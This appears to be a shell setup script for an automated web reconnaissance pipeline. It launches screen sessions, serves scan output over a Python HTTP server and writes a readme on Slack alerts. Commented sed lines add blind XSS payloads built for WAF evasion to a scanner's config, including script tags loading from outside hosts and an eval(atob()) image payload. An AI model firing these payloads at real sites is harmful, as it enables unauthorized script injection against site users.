yes|apt install screen
screen -dmS $"bash"
cmd=$"source /root/sh/click_one.sh"
screen -x -S bash -X stuff "$cmd"
screen -x -S bash -X stuff $'\n'

screen -dmS $"http"
cmd=$"python -m SimpleHTTPServer 62345"
screen -x -S http -X stuff "$cmd"
screen -x -S http -X stuff $'\n'

mkdir /root/script
clear
echo ""
echo ""
echo "------" > /root/sh/readme.txt
head -18 /root/sh/du_hast.sh | tail -1 >> /root/sh/readme.txt
#time=`date "+%Y-%m-%d_%H:%M:%S"` ; echo "curl -X POST -H \"Content-type:application/json\" --data '{\"text\":\"${time}\"}' https://hooks.slack.com/services/token/token/token" > /root/script/slack.sh ; bash /root/script/slack.sh ; rm /root/script/slack.sh >> /root/sh/readme.txt
echo "" >> /root/sh/readme.txt
echo "replace https://URL to your slack webhook , vi /root/script/webhook.sh" >> /root/sh/readme.txt
echo "OR NOT, then run without Slack alert" >> /root/sh/readme.txt
echo "" >> /root/sh/readme.txt
echo "" >> /root/sh/readme.txt
#sed "s,    '<sCriPt sRc=//14.rs>'\,,    'ceye.url'\,\n    '<sCriPt sRc=//14.rs>'\,\n    '\"><script src=blindxss></script>'\,\n    'httpceye.url/'\,,g" core/config.py > 1.txt ; mv 1.txt core/config.py ; sed "s,blindPayload = '',blindPayload = (  # Payloads for filter & WAF evasion\n    '\"><script src=blindxss></script>'\,\n    '\"><img src=xxssonerror=eval(atob(this.id))>'\,\n    '\<script>$.getScript(\"//xss\")</script>'),g" core/config.py > 1.txt ; mv 1.txt core/config.py >> /root/sh/readme.txt
head -24 /root/sh/du_hast.sh | tail -1 >> /root/sh/readme.txt
echo "" >> /root/sh/readme.txt
echo "replace URL to your blind payload , vi /root/script/xss.sh" >> /root/sh/readme.txt
echo "OR NOT, then run without potential blind vuln" >> /root/sh/readme.txt
echo "------> statu"
echo "screen -ls"
echo "screen -r nameOfScreen"
echo "------> output will be"
echo "output.zip------cd /root/zip" ; echo "output.txt------cd /root/z_juice" ; echo "output.web------http://ip:62345/z_juice"
echo "------> configure"
echo "cat /root/sh/readme.txt"


